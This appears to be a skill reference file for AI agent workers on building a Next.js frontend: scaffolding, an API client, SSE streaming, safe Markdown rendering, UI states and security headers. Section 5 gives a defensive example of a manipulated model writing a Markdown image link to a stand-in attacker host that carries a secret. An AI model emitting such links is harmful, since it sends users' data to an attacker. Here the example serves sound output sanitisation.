
# Next.js patterns (reference for frontend-engineering)

Judges see the UI first. It must be fast, clear, honest about state (loading/empty/error), and never break
on the golden path. Build against the contract stubs from minute one; real data arrives as CORE merges.

## 0. Load these with this skill
- **`frontend-design`** — commit to the PLAN.md §4 "Design direction" (tone, palette, type pairing) and make it
  distinctive, not template-looking. Same direction on every screen.
- **`vercel-react-best-practices`** — performance rules for components, data fetching and bundle size.
- **`web-design-guidelines`** — audit your own UI before `worker_done`; fix what it reports on the golden path.
- **`verification-before-completion`** — paste `lint`, `typecheck`, `build` output in your report.
- **Next.js docs that match your version**: Next.js 16.3+ `next dev` generates `apps/web/AGENTS.md` and
  `apps/web/CLAUDE.md` pointing at the bundled docs — keep and commit them. On older versions run
  `npx @next/codemod@canary agents-md` once.

## 1. Scaffold (first UI task only)
```
npx create-next-app@latest apps/web --ts --tailwind --eslint --app --src-dir --import-alias "@/*" --use-npm --yes
cd apps/web
npx shadcn@latest init -d
npx shadcn@latest add button card input textarea badge dialog sonner skeleton tabs table scroll-area
npm i @tanstack/react-query openapi-fetch zod react-markdown remark-gfm rehype-sanitize
npm i -D openapi-typescript
```
`package.json` scripts: `"dev": "next dev -p 3001"`, `"api:types": "openapi-typescript ../../contracts/openapi.json -o src/lib/api/schema.d.ts"`,
`"typecheck": "tsc --noEmit"`. Set `"strict": true` in tsconfig (default). Run `npm run api:types` after every
contract change (LEAD broadcasts them).

## 2. Structure (vertical slices, mirrors `apps/api/app/features/`)
```
src/app/                    thin routes: compose features (server components by default; "use client" only where interactive)
src/app/layout.tsx          LEAD
src/features/<name>/        one folder per capability, owned by worker ui-<name>:
  components/               feature UI (AskBox.tsx, AnswerStream.tsx, Citations.tsx)
  hooks.ts                  TanStack Query hooks / SSE hook for this feature
  api.ts                    typed calls for this feature's endpoints only (uses src/lib/api/client.ts)
src/components/ui/          shadcn primitives (generated; first UI worker owns, others ask LEAD)
src/lib/env.ts              validated public env
src/lib/api/                client.ts, schema.d.ts (generated), errors.ts, sse.ts — shared
e2e/<name>.spec.ts          the feature's Playwright tests
```
Rules: a feature never imports from another feature folder; shared pieces go to `components/ui/` or `lib/`.
Pages in `src/app/` import from `src/features/*` and stay thin.

## 3. Env, client, errors
```ts
// src/lib/env.ts — only public, non-secret values; reference process.env.NEXT_PUBLIC_* literally
import { z } from "zod";
export const env = z.object({ NEXT_PUBLIC_API_BASE_URL: z.string().url() })
  .parse({ NEXT_PUBLIC_API_BASE_URL: process.env.NEXT_PUBLIC_API_BASE_URL });

// src/lib/api/client.ts
import createClient from "openapi-fetch";
import type { paths } from "./schema";
import { env } from "@/lib/env";
export const api = createClient<paths>({ baseUrl: env.NEXT_PUBLIC_API_BASE_URL });
// const { data, error } = await api.GET("/api/v1/documents", { params: { query: { limit: 20 } } });

// src/lib/api/errors.ts — problem+json → typed error with request_id for support
export class ApiError extends Error {
  constructor(public status: number, public title: string, public requestId?: string) { super(title); }
}
export async function toApiError(res: Response): Promise<ApiError> {
  try { const p = await res.json(); return new ApiError(res.status, p.title ?? res.statusText, p.request_id); }
  catch { return new ApiError(res.status, res.statusText); }
}
```
`apps/web/.env.local`: `NEXT_PUBLIC_API_BASE_URL=http://localhost:8000` (or your own API port). Secrets never
go in the web app. If the browser must not see something, add a Next route handler that proxies server-side.

## 4. Streaming (POST + SSE) — `src/lib/api/sse.ts`
```ts
import { env } from "@/lib/env";
import { toApiError } from "./errors";

export async function streamSSE(path: string, body: unknown,
  onEvent: (type: string, data: unknown) => void, signal?: AbortSignal): Promise<void> {
  const res = await fetch(`${env.NEXT_PUBLIC_API_BASE_URL}${path}`, {
    method: "POST", signal, body: JSON.stringify(body),
    headers: { "Content-Type": "application/json", Accept: "text/event-stream" },
  });
  if (!res.ok || !res.body) throw await toApiError(res);
  const reader = res.body.pipeThrough(new TextDecoderStream()).getReader();
  let buf = "";
  for (;;) {
    const { value, done } = await reader.read();
    if (done) break;
    buf += value;
    let i: number;
    while ((i = buf.indexOf("\n\n")) !== -1) {
      const block = buf.slice(0, i); buf = buf.slice(i + 2);
      let type = "message"; const data: string[] = [];
      for (const line of block.split("\n")) {
        if (line.startsWith("event:")) type = line.slice(6).trim();
        else if (line.startsWith("data:")) data.push(line.slice(5).trimStart());
      }
      if (data.length) onEvent(type, JSON.parse(data.join("\n")));
    }
  }
}
```
Chat UX: append `token` events to the message, render `citations` as numbered chips that open the source,
show `error` events inline with the request ID, Stop button (AbortController), auto-scroll that respects
user scroll, Enter to send / Shift+Enter for newline, input disabled while streaming.

## 5. Rendering model output safely
```tsx
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import rehypeSanitize from "rehype-sanitize";
<ReactMarkdown remarkPlugins={[remarkGfm]} rehypePlugins={[rehypeSanitize]}
  disallowedElements={["img"]} unwrapDisallowed>{text}</ReactMarkdown>
```
Images are dropped: a model tricked into writing `![x](https://attacker/?q=secret)` must not make the
browser call out (OWASP LLM10:2026 improper output handling).
Never `dangerouslySetInnerHTML` with model or user content. Links from model output: `rel="noopener noreferrer"`.

## 6. Every screen has four states
Loading (skeletons, not spinners for > 300 ms) · Empty (what to do next + primary action) · Error (human
message + retry + request ID) · Success. Mutations: disable the button, show progress, toast on result
(`sonner`). Long jobs: progress bar polling `GET /jobs/{id}` every 1–2 s with backoff.

## 7. Quality bar
- Accessibility: semantic elements, labels for inputs, visible focus, `aria-live="polite"` on streaming output,
  keyboard reachable, contrast AA.
- Responsive: works at 375 px and 1440 px. Max content width ~ 1100 px.
- Visual consistency: shadcn tokens, one accent colour, consistent spacing scale, no lorem ipsum — use seed data.
- Performance: server components for static content, dynamic import for heavy widgets, `next/image`.
- Security headers in `next.config.ts`:
```ts
const securityHeaders = [
  { key: "X-Content-Type-Options", value: "nosniff" },
  { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
  { key: "X-Frame-Options", value: "DENY" },
  { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=()" }, // relax if the app needs them
];
const nextConfig = { async headers() { return [{ source: "/(.*)", headers: securityHeaders }]; } };
export default nextConfig;
```
- Test IDs: exactly the `data-testid` names listed in `docs/ux/wireframes.md` (the UX ↔ frontend ↔ QA
  contract) on every golden-path control and result, so Playwright specs stay stable.

## 8. Done checklist
`npm run lint` + `npm run typecheck` + `npm run build` pass · types generated from the contract, none
hand-written · four states on every screen · streaming works with Stop · Markdown sanitised · no secrets or
provider calls in the browser · test IDs on the golden path · responsive at 375 px.
